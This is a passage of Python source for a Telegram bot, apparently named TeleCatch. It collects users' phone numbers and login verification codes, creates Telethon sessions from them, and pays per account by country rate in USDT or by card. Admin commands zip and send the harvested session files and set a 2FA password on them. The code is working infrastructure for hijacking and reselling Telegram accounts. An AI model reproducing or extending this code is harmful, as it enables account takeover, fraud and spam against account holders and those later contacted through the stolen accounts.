        bot.send_message(chat_id, "Send: `UserID Amount`"); user_data[chat_id] = {"state": "awaiting_removebalance_info"}

    elif action == "admins_menu":
        if call.from_user.id != ADMIN_ID: bot.answer_callback_query(call.id, "❌ Main Admin Only.", show_alert=True); return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Admin", callback_data="admin_add_admin"),
                   types.InlineKeyboardButton("➖ Remove Admin", callback_data="admin_remove_admin"))
        markup.add(types.InlineKeyboardButton("📋 List Admins", callback_data="admin_list_admins"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "👑 **Admin Management**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_admin":
        bot.send_message(chat_id, "Send the User ID of the new admin."); user_data[chat_id] = {"state": "awaiting_addadmin_id"}
    elif action == "remove_admin":
        bot.send_message(chat_id, "Send the User ID of the admin to remove."); user_data[chat_id] = {"state": "awaiting_removeadmin_id"}
    elif action == "list_admins":
        list_admins(call.message)

    elif action == "sessions_zip":
        create_and_send_session_zips(chat_id)

    elif action == "clear_sessions":
        show_clear_confirmation(call.message)

    elif action == "confirm_clear_sessions":
        clear_session_files(chat_id)

    elif action == "cancel_clear_sessions":
        bot.send_message(chat_id, "❌ Session file deletion cancelled.")

    elif action == "toggle_2fa":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
        twofa_status_tuple = cursor.fetchone()
        twofa_status = twofa_status_tuple[0] if twofa_status_tuple else "on"
        new_status = "off" if twofa_status == "on" else "on"
        cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_status', ?)", (new_status,))
        conn.commit()
        conn.close()
        bot.send_message(chat_id, f"✅ 2FA status toggled to {new_status.upper()}.")

    elif action == "change_2fa_password":
        bot.send_message(chat_id, "Send the new 2FA password.")
        user_data[chat_id] = {"state": "awaiting_new_2fa_password"}

    elif action == "main_panel":
        admin_panel(call.message)

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle start and help commands"""
    user_id = message.from_user.id
    
    # Initialize user in database
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR IGNORE INTO users (user_id, full_name, join_date) 
        VALUES (?, ?, ?)
    """, (user_id, message.from_user.first_name, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check channel membership
    if not check_channel_membership(user_id) and not is_admin(user_id):
        send_join_channel_message(message.chat.id)
        return
    
    welcome_text = LanguageManager.get_text('welcome', language)
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(commands=['phone'])
def handle_phone(message):
    """Handle phone number submission"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check channel membership
    if not check_channel_membership(user_id) and not is_admin(user_id):
        send_join_channel_message(message.chat.id)
        return
    
    user_data[user_id] = {'state': 'awaiting_phone'}
    bot.send_message(message.chat.id, LanguageManager.get_text('enter_phone', language))

@bot.message_handler(commands=['account'])
def handle_account(message):
    """Handle account balance check"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, verified_count, unverified_count, frozen_balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        balance, verified, pending, frozen_balance = result
        balance_text = LanguageManager.get_text('balance', language, 
                                              user_id=user_id, verified=verified, 
                                              pending=pending, balance=balance, frozen=frozen_balance)
        bot.send_message(message.chat.id, balance_text)
    else:
        bot.send_message(message.chat.id, "❌ Account not found")

@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    """Handle withdrawal options"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check if withdraw is enabled
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = 'withdraw_status'")
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == 'off':
        bot.send_message(message.chat.id, "❌ Withdrawals are currently disabled.")
        return
    
    # Check balance
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, withdraw_password FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        bot.send_message(message.chat.id, "❌ Account not found.")
        return
    
    balance, has_password = result
    
    if balance < MIN_WITHDRAW:
        bot.send_message(message.chat.id, 
                        LanguageManager.get_text('withdraw_min', language, 
                                               min=MIN_WITHDRAW, balance=balance))
        return
    
    if not has_password:
        bot.send_message(message.chat.id, "🔐 Please set a withdrawal password first using /setpassword")
        return
    
    # Show withdrawal options
    options_text = LanguageManager.get_text('withdraw_method', language, balance=balance)
    options_text += "\n\n/withdraw_ld - LD Card withdrawal\n/withdraw_usdt - USDT (BEP20) withdrawal"
    bot.send_message(message.chat.id, options_text)

@bot.message_handler(commands=['withdraw_ld'])
def handle_withdraw_ld(message):
    """Handle LD card withdrawal"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_ld_info'}
    bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_ld', language))

@bot.message_handler(commands=['withdraw_usdt'])
def handle_withdraw_usdt(message):
    """Handle USDT withdrawal"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_usdt_address'}
    bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_usdt', language))

@bot.message_handler(commands=['capacity'])
def handle_capacity(message):
    """Show available countries and rates"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT country_code, country_name, rate, claim_time_seconds, capacity, usage_count FROM country_rates WHERE status = 'on'")
    countries = cursor.fetchall()
    conn.close()
    
    if not countries:
        bot.send_message(message.chat.id, "❌ No countries available at the moment.")
        return
    
    message_text = "🌍 Available Countries & Rates\n\n"
    for country in countries:
        code, name, rate, time, capacity, usage = country
        flag = get_country_flag(code)
        available = capacity - usage
        message_text += f"{flag} {name} ({code})\n"
        message_text += f"   💰 Rate: ${rate:.2f}\n"
        message_text += f"   ⏱️ Time: {time}s\n"
        message_text += f"   📊 Available: {available}/{capacity}\n\n"
    
    bot.send_message(message.chat.id, message_text)

@bot.message_handler(commands=['setpassword'])
def handle_set_password(message):
    """Handle password setup"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_password'}
    bot.send_message(message.chat.id, "🔐 Set withdrawal password:")

@bot.message_handler(commands=['language'])
def handle_language(message):
    """Handle language selection"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    bot.send_message(message.chat.id, "🌍 Choose language:\n/setlang_en - English\n/setlang_zh - Chinese\n/setlang_ar - Arabic")

@bot.message_handler(commands=['setlang_en', 'setlang_zh', 'setlang_ar'])
def handle_set_language(message):
    """Set user language"""
    user_id = message.from_user.id
    language_code = message.text.split('_')[1]
    
    LanguageManager.set_user_language(user_id, language_code)
    language_name = LANGUAGES.get(language_code, language_code)
    
    bot.send_message(message.chat.id, LanguageManager.get_text('language_set', 'en', language=language_name))

@bot.message_handler(commands=['cancel'])
def handle_cancel(message):
    """Cancel current operation"""
    user_id = message.from_user.id
    if user_id in user_data:
        del user_data[user_id]
        bot.send_message(message.chat.id, "✅ Current operation cancelled.")
    else:
        bot.send_message(message.chat.id, "❌ No active operation to cancel.")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['admin'])
def handle_admin(message):
    """Admin panel"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "❌ Access denied")
        return
    
    language = LanguageManager.get_user_language(user_id)
    admin_text = LanguageManager.get_text('admin_panel', language)
    admin_text += """

📊 Statistics & Management:
/admin_stats - View bot statistics
/admin_users - User management

❄️ Account Management:
/admin_freeze [user_id] [reason] - Freeze account
/admin_unfreeze [user_id] - Unfreeze account

🌍 Country Management:
/admin_countries - List all countries
/admin_add_country - Add new country
/admin_update_country - Update country
/admin_remove_country - Remove country

🔧 System Settings:
/admin_broadcast - Send broadcast
/admin_change_2fa - Change 2FA password
/admin_settings - System settings
"""
    
    bot.send_message(message.chat.id, admin_text)

@bot.message_handler(commands=['admin_stats'])
def handle_admin_stats(message):
    """Admin statistics"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT SUM(balance) FROM users")
    total_balance = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT SUM(frozen_balance) FROM users")
    total_frozen = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT SUM(verified_count) FROM users")
    total_sessions = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT COUNT(*) FROM users WHERE account_frozen = 1")
    frozen_accounts = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM country_rates")
    total_countries = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM withdraw_history WHERE status = 'pending'")
    pending_withdrawals = cursor.fetchone()[0]
    
    conn.close()
    
    stats_text = f"""
📊 Admin Statistics

👥 Total Users: {total_users}
💰 Total Balance: ${total_balance:.2f}
❄️ Total Frozen: ${total_frozen:.2f}
✅ Total Sessions: {total_sessions}
🔒 Frozen Accounts: {frozen_accounts}
🌍 Total Countries: {total_countries}
⏳ Pending Withdrawals: {pending_withdrawals}
    """
    
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(commands=['admin_freeze'])
def handle_admin_freeze(message):
    """Freeze user account"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, "Usage: /admin_freeze user_id reason")
            return
        
        target_user = int(command_parts[1])
        reason = " ".join(command_parts[2:]) if len(command_parts) > 2 else "Administrative decision"
        
        freeze_account(target_user, reason)
        
        language = LanguageManager.get_user_language(message.from_user.id)
        bot.send_message(message.chat.id, LanguageManager.get_text('account_frozen_success', language, user_id=target_user, reason=reason))
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID")

@bot.message_handler(commands=['admin_unfreeze'])
def handle_admin_unfreeze(message):
    """Unfreeze user account"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, "Usage: /admin_unfreeze user_id")
            return
        
        target_user = int(command_parts[1])
        unfreeze_account(target_user)
        
        language = LanguageManager.get_user_language(message.from_user.id)
        bot.send_message(message.chat.id, LanguageManager.get_text('account_unfrozen_success', language, user_id=target_user))
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID")

@bot.message_handler(commands=['admin_countries'])
def handle_admin_countries(message):
    """List all countries with details"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM country_rates")
    countries = cursor.fetchall()
    conn.close()
    
    if not countries:
        bot.send_message(message.chat.id, "❌ No countries in database.")
        return
    
    message_text = "🌍 All Countries in Database\n\n"
    for country in countries:
        code, name, rate, time, status, capacity, usage = country
        flag = get_country_flag(code)
        available = capacity - usage
        message_text += f"{flag} {name} ({code})\n"
        message_text += f"   💰 Rate: ${rate:.2f}\n"
        message_text += f"   ⏱️ Time: {time}s\n"
        message_text += f"   📊 Capacity: {available}/{capacity}\n"
        message_text += f"   🔧 Status: {status}\n"
        message_text += f"   👥 Usage: {usage}\n\n"
    
    bot.send_message(message.chat.id, message_text)

@bot.message_handler(commands=['admin_add_country'])
def handle_admin_add_country(message):
    """Add new country"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_add'}
    bot.send_message(message.chat.id, """
🌍 Add New Country

Please send country details in this format:
CountryCode CountryName Rate ClaimTime Capacity

Example:
BD Bangladesh 10.0 30 20
""")

@bot.message_handler(commands=['admin_update_country'])
def handle_admin_update_country(message):
    """Update country information"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_update'}
    bot.send_message(message.chat.id, """
🌍 Update Country

Please send update details in this format:
CountryCode Field NewValue

Available fields: rate, claim_time, status, capacity, name

Examples:
BD rate 15.0
US capacity 25
BD status off
""")

@bot.message_handler(commands=['admin_remove_country'])
def handle_admin_remove_country(message):
    """Remove country"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_remove'}
    bot.send_message(message.chat.id, "🌍 Remove Country\n\nSend country code to remove:")

@bot.message_handler(commands=['admin_broadcast'])
def handle_admin_broadcast(message):
    """Start broadcast process"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_broadcast'}
    bot.send_message(message.chat.id, "📢 Broadcast Message\n\nSend the message you want to broadcast to all users:")

@bot.message_handler(commands=['admin_change_2fa'])
def handle_admin_change_2fa(message):
    """Change 2FA password"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_2fa_change'}
    bot.send_message(message.chat.id, "🔐 Change 2FA Password\n\nSend new 2FA password:")

# ==================== ADMIN MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.from_user.id in user_data)
def handle_admin_messages(message):
    """Handle admin state messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    language = LanguageManager.get_user_language(user_id)
    state = user_data[user_id].get('state')
    
    if state == 'awaiting_country_add':
        try:
            parts = text.split()
            if len(parts) < 5:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: CountryCode CountryName Rate ClaimTime Capacity")
                return
            
            country_code = parts[0].upper()
            country_name = parts[1]
            rate = float(parts[2])
            claim_time = int(parts[3])
            capacity = int(parts[4])
            
            if add_country(country_code, country_name, rate, claim_time, capacity):
                bot.send_message(message.chat.id, LanguageManager.get_text('country_added', language, country_code=country_code))
            else:
                bot.send_message(message.chat.id, "❌ Error adding country")
            
            del user_data[user_id]
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    
    elif state == 'awaiting_country_update':
        try:
            parts = text.split()
            if len(parts) < 3:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: CountryCode Field NewValue")
                return
            
            country_code = parts[0].upper()
            field = parts[1].lower()
            new_value = parts[2]
            
            # Convert value based on field type
            if field in ['rate']:
                new_value = float(new_value)
            elif field in ['claim_time', 'capacity']:
                new_value = int(new_value)
            elif field == 'name':
                new_value = ' '.join(parts[2:])
            
            field_map = {
                'rate': 'rate',
                'claim_time': 'claim_time_seconds',
                'status': 'status',
                'capacity': 'capacity',
                'name': 'country_name'
            }
            
            if field not in field_map:
                bot.send_message(message.chat.id, "❌ Invalid field. Use: rate, claim_time, status, capacity, name")
                return
            
            if update_country(country_code, **{field_map[field]: new_value}):
                bot.send_message(message.chat.id, LanguageManager.get_text('country_updated', language, country_code=country_code))
            else:
                bot.send_message(message.chat.id, "❌ Error updating country")
            
            del user_data[user_id]
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    
    elif state == 'awaiting_country_remove':
        country_code = text.upper()
        
        if remove_country(country_code):
            bot.send_message(message.chat.id, LanguageManager.get_text('country_removed', language, country_code=country_code))
        else:
            bot.send_message(message.chat.id, "❌ Error removing country")
        
        del user_data[user_id]
    
    elif state == 'awaiting_broadcast':
        admin_process_broadcast(message)
    
    elif state == 'awaiting_2fa_change':
        admin_process_change_2fa_password(message)

    elif state == 'awaiting_rate':
        admin_process_set_rate(message)

    elif state == 'awaiting_capacity':
        admin_process_set_capacity(message)

    elif state == 'awaiting_toggle':
        admin_process_toggle_status(message)

    elif state == 'awaiting_addbalance_info':
        admin_process_balance_change(message, "add")

    elif state == 'awaiting_removebalance_info':
        admin_process_balance_change(message, "remove")

    elif state == 'awaiting_addadmin_id':
        admin_process_admin_change(message, "add")

    elif state == 'awaiting_removeadmin_id':
        admin_process_admin_change(message, "remove")

    elif state == 'awaiting_new_2fa_password':
        admin_process_change_2fa_password(message)

# ==================== MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all text messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_data:
        handle_start(message)
        return
    
    state = user_data[user_id].get('state')
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        del user_data[user_id]
        return
    
    if state == 'awaiting_phone':
        if re.match(r'^\+\d{10,15}$', text):
            processing_msg = bot.send_message(message.chat.id, "⏳ Processing your number...")
            run_telethon_task(send_verification_code, message.chat.id, text, processing_msg.message_id)
        else:
            bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
    
    elif state == 'awaiting_code':
        if re.match(r'^\d{5}$', text):
            run_telethon_task(verify_code_and_create_session, message.chat.id, text)
        else:
            bot.send_message(message.chat.id, LanguageManager.get_text('invalid_code', language))
    
    elif state == 'awaiting_password':
        if len(text) >= 4:
            if set_withdraw_password(user_id, text):
                bot.send_message(message.chat.id, LanguageManager.get_text('password_set', language))
            else:
                bot.send_message(message.chat.id, "❌ Error setting password")
        else:
            bot.send_message(message.chat.id, "❌ Password must be at least 4 characters")
        del user_data[user_id]
    
    elif state == 'awaiting_ld_info':
        process_withdraw_ld(message)
    
    elif state == 'awaiting_usdt_address':
        process_usdt_withdrawal(message)

# ==================== BOT STARTUP ====================
if __name__ == "__main__":
    logger.info("Starting TeleCatch Bot...")
    check_bot_permissions()
    
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except requests.exceptions.ConnectionError as e:
            logging.error(f"Connection error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Unexpected error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
